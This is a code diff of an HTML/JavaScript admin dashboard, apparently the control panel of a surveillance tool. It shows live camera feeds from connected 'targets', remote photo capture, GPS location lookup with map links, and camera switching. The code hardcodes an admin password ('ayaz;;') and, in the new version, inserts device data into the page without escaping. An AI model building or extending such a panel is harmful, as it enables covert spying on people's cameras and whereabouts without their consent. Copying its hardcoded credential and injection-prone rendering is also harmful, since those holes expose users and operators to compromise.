@@ -1,341 +1,260 @@
 ﻿<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Admin Dashboard - CCTV Mode</title>
-<style>
-* { box-sizing: border-box; }
-body { margin: 0; padding: 20px; background: #121212; color: #eee; font-family: Arial, sans-serif; }
-.container { max-width: 1300px; margin: auto; }
-h1, h2 { color: white; }
-.panel { background: #1e1e1e; padding: 20px; margin-bottom: 20px; border-radius: 10px; }
-.controls { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; }
-button { border: 0; padding: 10px 15px; border-radius: 6px; cursor: pointer; background: #3498db; color: white; }
-button:hover { opacity: 0.9; }
-button:disabled { opacity: 0.5; cursor: not-allowed; }
-button.danger { background: #e74c3c; }
-button.success { background: #27ae60; }
-button.switch { background: #8e44ad; }
-button.gray { background: #555; }
-.status { font-weight: bold; }
-.users { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 15px; }
-.user-card { background: #292929; padding: 15px; border-radius: 8px; display: flex; flex-direction: column; gap: 10px; border: 1px solid #444; }
-.user-info { font-size: 13px; }
-.cctv-feed { width: 100%; height: 180px; background: #000; border-radius: 6px; object-fit: cover; display: block; }
-.user-actions { display: flex; gap: 5px; flex-wrap: wrap; margin-top: 5px; }
-.photo-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 15px; }
-.photo { background: #292929; padding: 10px; border-radius: 8px; }
-.photo img { width: 100%; border-radius: 6px; display: block; margin-bottom: 8px; }
-.history { max-height: 400px; overflow-y: auto; }
-.history-item { padding: 10px; margin-bottom: 8px; background: #292929; border-radius: 6px; font-size: 13px; }
-.login { min-height: 100vh; display: flex; justify-content: center; align-items: center; }
-.login-box { width: 90%; max-width: 400px; background: #1e1e1e; padding: 25px; border-radius: 10px; }
-input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 6px; border: 1px solid #555; background: #111; color: white; }
-.hidden { display: none !important; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard - Live Monitoring</title>
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: #121212;
+            color: #eee;
+        }
+        header {
+            background: #1e1e1e;
+            padding: 15px 25px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #333;
+        }
+        h1 { margin: 0; font-size: 20px; color: #fff; }
+        .controls button {
+            background: #e74c3c;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .container {
+            padding: 20px;
+            max-width: 1200px;
+            margin: auto;
+        }
+        .login-box {
+            width: 100%;
+            max-width: 350px;
+            background: #1e1e1e;
+            padding: 30px;
+            border-radius: 10px;
+            margin: 100px auto;
+            text-align: center;
+            border: 1px solid #333;
+        }
+        .login-box input {
+            width: 100%;
+            padding: 10px;
+            margin: 15px 0;
+            background: #2c2c2c;
+            border: 1px solid #444;
+            color: #fff;
+            border-radius: 6px;
+        }
+        .login-box button {
+            width: 100%;
+            background: #27ae60;
+            color: white;
+            border: none;
+            padding: 10px;
+            border-radius: 6px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
+        }
+        .card {
+            background: #1e1e1e;
+            border: 1px solid #333;
+            border-radius: 10px;
+            padding: 15px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.4);
+        }
+        .card img {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+            border-radius: 6px;
+            background: #000;
+        }
+        .card-info { margin-top: 10px; font-size: 13px; color: #ccc; }
+        .card-actions {
+            margin-top: 12px;
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+        .btn {
+            padding: 6px 12px;
+            border: none;
+            border-radius: 5px;
+            font-size: 12px;
+            font-weight: bold;
+            cursor: pointer;
+            color: white;
+        }
+        .btn-capture { background: #3498db; }
+        .btn-location { background: #27ae60; }
+        .btn-switch { background: #9b59b6; }
+        .btn:hover { opacity: 0.85; }
+        .maps-link {
+            display: inline-block;
+            margin-top: 5px;
+            color: #3498db;
+            text-decoration: underline;
+            font-weight: bold;
+        }
+    </style>
 </head>
 <body>
 
-<div id="loginPage" class="login">
-    <div class="login-box">
-        <h2>Admin Login</h2>
-        <input id="password" type="password" placeholder="Admin Password">
-        <button onclick="login()" style="width:100%;">Login</button>
-        <p id="loginError" style="color:#e74c3c;"></p>
-    </div>
+<div id="loginScreen" class="login-box">
+    <h2>Admin Login</h2>
+    <input type="password" id="passwordInput" placeholder="Enter password">
+    <button onclick="login()">Login</button>
 </div>
 
-<div id="dashboard" class="container hidden">
-    <h1>Admin Dashboard (CCTV Live View)</h1>
-    
-    <div class="panel">
-        <h2>Controls</h2>
+<div id="dashboardScreen" style="display: none;">
+    <header>
+        <h1>Admin Control Panel</h1>
         <div class="controls">
-            <button id="linkButton" onclick="toggleLink()">Disable Link</button>
-            <button id="autoButton" onclick="toggleAutoCapture()">Auto Capture: ON</button>
-            <button class="gray" onclick="logout()">Logout</button>
-            <span id="linkStatus" class="status">Status: Loading...</span>
+            <button onclick="logout()">Logout</button>
         </div>
-    </div>
-
-    <div class="panel">
-        <h2>Active Users CCTV Feeds</h2>
-        <p id="userCount">0 / 5</p>
-        <div id="usersList" class="users">Waiting for users...</div>
-    </div>
-
-    <div class="panel">
-        <h2>Temporary Captured Photos</h2>
-        <div id="photoGrid" class="photo-grid">No photos.</div>
-    </div>
-
-    <div class="panel">
-        <h2>Link Access History</h2>
-        <div id="history" class="history">Loading history...</div>
+    </header>
+    <div class="container">
+        <h2>Active Live Targets</h2>
+        <div id="targetsGrid" class="grid">
+            <p style="color: #777;">No active targets connected.</p>
+        </div>
     </div>
 </div>
 
 <script src="/socket.io/socket.io.js"></script>
 <script>
 let socket = null;
-let isLinkActive = true;
-let isAutoCapture = true;
-let maxUsers = 5;
-let currentPassword = "";
+const targetsGrid = document.getElementById("targetsGrid");
+const loginScreen = document.getElementById("loginScreen");
+const dashboardScreen = document.getElementById("dashboardScreen");
+
+async function checkStatus() {
+    try {
+        const res = await fetch("/api/admin/status");
+        const data = await res.json();
+        if (data.authenticated) {
+            initSocket();
+        }
+    } catch (e) {}
+}
+checkStatus();
 
 async function login() {
-    const password = document.getElementById("password").value;
-    const response = await fetch("/api/admin/login", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ password })
-    });
-    const data = await response.json();
-    if (!data.ok) {
-        document.getElementById("loginError").textContent = data.error || "Login failed.";
-        return;
-    }
-    currentPassword = password;
-    showDashboard();
-}
-
-async function checkLogin() {
-    const response = await fetch("/api/admin/status");
-    const data = await response.json();
-    if (data.authenticated) showDashboard();
-    else showLogin();
-}
-
-function showLogin() {
-    document.getElementById("loginPage").classList.remove("hidden");
-    document.getElementById("dashboard").classList.add("hidden");
-}
-
-function showDashboard() {
-    document.getElementById("loginPage").classList.add("hidden");
-    document.getElementById("dashboard").classList.remove("hidden");
-    connectSocket();
-}
-
-function connectSocket() {
-    if (socket) return;
-    socket = io();
-
-    socket.on("connect", () => { 
-        socket.emit("admin-auth", currentPassword || "ayaz;;"); 
-    });
-    
-    socket.on("admin-auth-required", () => { showLogin(); });
-    
-    socket.on("admin-initial-state", state => {
-        isLinkActive = state.linkActive;
-        isAutoCapture = state.autoCapture;
-        maxUsers = state.maxUsers;
-        updateLinkUI();
-        updateAutoUI();
-        renderUsers(state.users);
-        renderHistory(state.history);
-        renderPhotos(state.photos);
-    });
-
-    socket.on("update-users-list", users => { renderUsers(users); });
-    socket.on("link-status", status => { isLinkActive = status; updateLinkUI(); });
-    socket.on("auto-capture-status", status => { isAutoCapture = status; updateAutoUI(); });
-    socket.on("access-event", event => { addHistoryEvent(event); });
-    
-    socket.on("update-live-stream", data => {
-        const img = document.getElementById(`cctv-${data.socketId}`);
-        if (img) {
-            img.src = data.frameData;
-            img.style.display = "block";
+    const password = document.getElementById("passwordInput").value;
+    try {
+        const res = await fetch("/api/admin/login", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ password })
+        });
+        const data = await res.json();
+        if (data.ok) {
+            initSocket();
+        } else {
+            alert("Wrong password!");
         }
-    });
-
-    socket.on("new-photo", photo => { addPhoto(photo); });
-    socket.on("photo-deleted", photoId => {
-        const element = document.getElementById(`photo-${photoId}`);
-        if (element) element.remove();
-    });
-}
-
-function renderUsers(users) {
-    const container = document.getElementById("usersList");
-    const ids = Object.keys(users);
-    document.getElementById("userCount").textContent = `${ids.length} / ${maxUsers}`;
-
-    if (ids.length === 0) {
-        container.innerHTML = "No active users.";
-        return;
+    } catch (e) {
+        alert("Login failed.");
     }
-
-    // Keep existing cards or recreate cleanly
-    container.innerHTML = "";
-
-    ids.forEach(id => {
-        const user = users[id];
-        const card = document.createElement("div");
-        card.className = "user-card";
-        card.id = `user-card-${id}`;
-
-        let locationText = "Location: Fetching...";
-        if (user.location) {
-            locationText = `Lat: ${user.location.latitude}, Lng: ${user.location.longitude}`;
-        }
-
-        card.innerHTML = `
-            <img id="cctv-${id}" class="cctv-feed" style="display:none;" alt="Live Feed">
-            <div class="user-info">
-                <strong>${escapeHtml(user.deviceInfo)}</strong><br>
-                <small>ID: ${escapeHtml(id.substring(0, 8))}</small><br>
-                <small style="color: #2ecc71;">📍 ${escapeHtml(locationText)}</small>
-            </div>
-            <div class="user-actions">
-                <button onclick="captureUser('${id}')">Capture</button>
-                <button class="success" onclick="requestLoc('${id}')">Location</button>
-                <button class="switch" onclick="switchCam('${id}')">Switch Cam</button>
-            </div>
-        `;
-        container.appendChild(card);
-    });
-}
-
-function captureUser(id) { socket.emit("admin-trigger-capture", id); }
-function requestLoc(id) { socket.emit("admin-request-location", id); }
-function switchCam(id) { socket.emit("admin-switch-camera", id); }
-
-async function toggleLink() {
-    const newStatus = !isLinkActive;
-    await fetch("/api/admin/link", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ active: newStatus })
-    });
-}
-
-async function toggleAutoCapture() {
-    const newStatus = !isAutoCapture;
-    await fetch("/api/admin/auto-capture", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ enabled: newStatus })
-    });
-}
-
-function updateLinkUI() {
-    const button = document.getElementById("linkButton");
-    const status = document.getElementById("linkStatus");
-    if (isLinkActive) {
-        button.textContent = "Disable Link";
-        button.className = "";
-        status.textContent = "Status: Active";
-        status.style.color = "#27ae60";
-    } else {
-        button.textContent = "Enable Link";
-        button.className = "danger";
-        status.textContent = "Status: Disabled";
-        status.style.color = "#e74c3c";
-    }
-}
-
-function updateAutoUI() {
-    const button = document.getElementById("autoButton");
-    button.textContent = `Auto Capture: ${isAutoCapture ? "ON" : "OFF"}`;
-}
-
-function renderPhotos(photos) {
-    const grid = document.getElementById("photoGrid");
-    grid.innerHTML = "";
-    if (!photos.length) {
-        grid.textContent = "No photos.";
-        return;
-    }
-    photos.forEach(photo => addPhoto(photo, false));
-}
-
-function addPhoto(photo, prepend = true) {
-    const grid = document.getElementById("photoGrid");
-    if (grid.textContent.trim() === "No photos.") grid.innerHTML = "";
-
-    const card = document.createElement("div");
-    card.className = "photo";
-    card.id = `photo-${photo.id}`;
-
-    const image = document.createElement("img");
-    image.src = photo.imageData;
-    image.alt = "Captured image";
-
-    const download = document.createElement("a");
-    download.href = `/api/admin/photos/${encodeURIComponent(photo.id)}/download`;
-    download.textContent = "Download";
-    download.style.display = "inline-block";
-    download.style.marginRight = "8px";
-    download.style.color = "#3498db";
-
-    const deleteButton = document.createElement("button");
-    deleteButton.textContent = "Delete";
-    deleteButton.className = "danger";
-    deleteButton.onclick = () => deletePhoto(photo.id);
-
-    card.appendChild(image);
-    card.appendChild(download);
-    card.appendChild(deleteButton);
-
-    if (prepend) grid.prepend(card);
-    else grid.appendChild(card);
-}
-
-async function deletePhoto(id) {
-    if (!confirm("Delete this photo?")) return;
-    await fetch(`/api/admin/photos/${encodeURIComponent(id)}`, { method: "DELETE" });
-}
-
-function renderHistory(history) {
-    const container = document.getElementById("history");
-    container.innerHTML = "";
-    if (!history.length) {
-        container.textContent = "No history.";
-        return;
-    }
-    history.forEach(event => addHistoryEvent(event, false));
-}
-
-function addHistoryEvent(event, prepend = true) {
-    const container = document.getElementById("history");
-    if (container.textContent.trim() === "No history.") container.innerHTML = "";
-
-    const item = document.createElement("div");
-    item.className = "history-item";
-    const type = event.event === "link-opened" ? "🔗 Link Opened" : "❌ Link Closed";
-
-    item.innerHTML = `
-        <strong>${type}</strong><br>
-        Device: ${escapeHtml(event.deviceInfo || "Unknown")}<br>
-        Session: ${escapeHtml((event.socketId || "").substring(0, 8))}<br>
-        Time: ${escapeHtml(event.time || "")}
-    `;
-
-    if (prepend) container.prepend(item);
-    else container.appendChild(item);
-}
-
-function escapeHtml(value) {
-    return String(value)
-        .replaceAll("&", "&amp;")
-        .replaceAll("<", "&lt;")
-        .replaceAll(">", "&gt;")
-        .replaceAll('"', "&quot;")
-        .replaceAll("'", "&#039;");
 }
 
 async function logout() {
     await fetch("/api/admin/logout", { method: "POST" });
-    currentPassword = "";
-    if (socket) { socket.disconnect(); socket = null; }
-    showLogin();
+    window.location.reload();
 }
 
-checkLogin();
+function initSocket() {
+    loginScreen.style.display = "none";
+    dashboardScreen.style.display = "block";
+
+    socket = io();
+
+    socket.emit("admin-auth", "ayaz;;");
+
+    socket.on("admin-initial-state", (data) => {
+        renderTargets(data.users);
+    });
+
+    socket.on("update-users-list", (users) => {
+        renderTargets(users);
+    });
+
+    socket.on("update-live-stream", (data) => {
+        const img = document.getElementById(`stream-${data.socketId}`);
+        if (img) {
+            img.src = data.frameData;
+        }
+    });
+
+    socket.on("new-photo", (photo) => {
+        // Optional handling for newly captured photos
+    });
+}
+
+function renderTargets(users) {
+    const keys = Object.keys(users);
+    if (keys.length === 0) {
+        targetsGrid.innerHTML = `<p style="color: #777;">No active targets connected.</p>`;
+        return;
+    }
+
+    let html = "";
+    keys.forEach(id => {
+        const target = users[id];
+        let locationText = "Location: Not requested yet";
+        
+        if (target.location) {
+            const lat = target.location.latitude;
+            const lng = target.location.longitude;
+            const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
+            locationText = `📍 Lat: ${lat}, Lng: ${lng}<br><a class="maps-link" href="${mapsUrl}" target="_blank">🗺️ Open in Google Maps</a>`;
+        }
+
+        html += `
+            <div class="card">
+                <img id="stream-${target.id}" src="" alt="Live Stream">
+                <div class="card-info">
+                    <strong>${target.deviceInfo}</strong><br>
+                    <span style="color: #888; font-size: 11px;">ID: ${target.id}</span><br>
+                    <div style="margin-top: 6px;">${locationText}</div>
+                </div>
+                <div class="card-actions">
+                    <button class="btn btn-capture" onclick="capturePhoto('${target.id}')">Capture</button>
+                    <button class="btn btn-location" onclick="requestLocation('${target.id}')">Location</button>
+                    <button class="btn btn-switch" onclick="switchCamera('${target.id}')">Switch Cam</button>
+                </div>
+            </div>
+        `;
+    });
+    targetsGrid.innerHTML = html;
+}
+
+function capturePhoto(id) {
+    socket.emit("admin-trigger-capture", id);
+}
+
+function requestLocation(id) {
+    socket.emit("admin-request-location", id);
+}
+
+function switchCamera(id) {
+    socket.emit("admin-switch-camera", id);
+}
 </script>
 </body>
 </html>
